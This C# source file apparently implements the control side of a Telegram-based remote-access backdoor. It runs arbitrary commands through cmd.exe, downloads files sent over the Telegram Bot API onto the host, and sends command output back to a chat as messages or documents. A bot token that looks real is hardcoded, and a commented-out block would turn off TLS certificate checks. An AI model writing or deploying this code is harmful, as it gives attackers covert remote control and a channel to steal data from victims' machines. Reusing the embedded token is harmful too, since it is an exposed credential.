using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace TeleBot_CangCot
{
    class Control
    {
        public static string botToken = "6525507053:AAHBZ6khXBZGCQEnOaDRhK8-4UOqA7WKm1U";
        public static string baseUrl = $"https://api.telegram.org/bot{botToken}/";
        public static string ExecuteCommand(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = $"/c \"{command}\"";

            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;

            startInfo.UseShellExecute = false;

            Process process = new Process();
            process.StartInfo = startInfo;

            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();

            if (!string.IsNullOrEmpty(error))
            {
                return $"Command execution error: {error}";
                throw new Exception($"Command execution error: {error}");
            }
            return output;
        }

        public static string upFile(string fileId, string savePath)
        {
            string url = baseUrl + "getFile?file_id=" + fileId;
            string res =sendRequest(url, "GET");
            Console.WriteLine(res);
            JObject data = JObject.Parse(res);
            string filepath = data["result"]["file_path"].ToString();
            string filename = savePath+"/"+filepath.Replace("/", "_");
            Console.WriteLine(filepath);
            url = $"https://api.telegram.org/file/bot{botToken}/{filepath}";
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    using (Stream responseStream = response.GetResponseStream())
                    {
                        using (FileStream fileStream = File.Create(filename))
                        {
                            responseStream.CopyTo(fileStream);
                        }
                    }
                }

                Console.WriteLine("Download completed.");
                return Path.GetFullPath(filename);
            }
            catch (WebException ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return ex.Message;
            }
            
        }
        public static string getUpdatesData()
        {
            string updateUrl = baseUrl + "getUpdates?offset=-10&limit=10";
            string response = sendRequest(updateUrl, "GET");
            return response;
        }



        public static string SendMessage(string chatId, string command, string message)
        {
            string sendMessageUrl = baseUrl + "sendMessage";

            string parseMode = "Markdown";
            if (message.Length > 4096)
            {
                string filePath = Path.GetTempFileName();
                File.WriteAllText(filePath, message);
                string response = sendDocument(chatId, command, filePath);
                File.Delete(filePath);
                return response;
            }

            message = $"Command: `{command}` \r\nResult: ```\r\n{message}\r\n```";
            NameValueCollection sendMessageData = new NameValueCollection {
                {
                    "chat_id",
                    chatId
                },
                {
                    "text",
                    message
                },
                {
                    "parse_mode",
                    parseMode
                }
            };

            string sendMessageResponse = sendMessage(sendMessageUrl, "POST", sendMessageData);


            return sendMessageResponse;
        }

        static string sendMessage(string url, string method, NameValueCollection data)
        {
            try
            {
                using (WebClient client = new WebClient())
                {

                    /*                    ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

                                        WebProxy proxy = new WebProxy("http://127.0.0.1:8080");

                                        client.Proxy = proxy;
                    */
                    byte[] responseBytes = client.UploadValues(url, method, data);
                    string response = Encoding.UTF8.GetString(responseBytes);
                    return response;
                }
            }
            catch (WebException ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return null;
            }
        }
        public static string sendDocument(string chatId, string command, string filePath)
        {
            string sendDocumentUrl = baseUrl + "sendDocument";

            try
            {
                using (HttpClient client = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    form.Add(new StringContent(chatId), "chat_id");
                    form.Add(new StringContent("Markdown"), "parse_mode");
                    byte[] fileContent = File.ReadAllBytes(filePath);
                    var fileContentStream = new ByteArrayContent(fileContent);
                    form.Add(fileContentStream, "document", Path.GetFileName(filePath));

                    form.Add(new StringContent($"Command: `{command}`"), "caption");


                    HttpResponseMessage response = client.PostAsync(sendDocumentUrl, form).Result;
                    string responseContent = response.Content.ReadAsStringAsync().Result;
                    return responseContent;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return null;
            }
        }



        public static string sendRequest(string url, string method, string data = null)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = method;

                if (data != null)
                {
                    byte[] postDataBytes = Encoding.UTF8.GetBytes(data);
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.ContentLength = postDataBytes.Length;

                    using (Stream requestStream = request.GetRequestStream())
                    {
                        requestStream.Write(postDataBytes, 0, postDataBytes.Length);
                    }
                }

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    using (Stream responseStream = response.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(responseStream))
                        {
                            return reader.ReadToEnd();
                        }
                    }
                }
            }
            catch (WebException ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return null;
            }
        }
    }
}
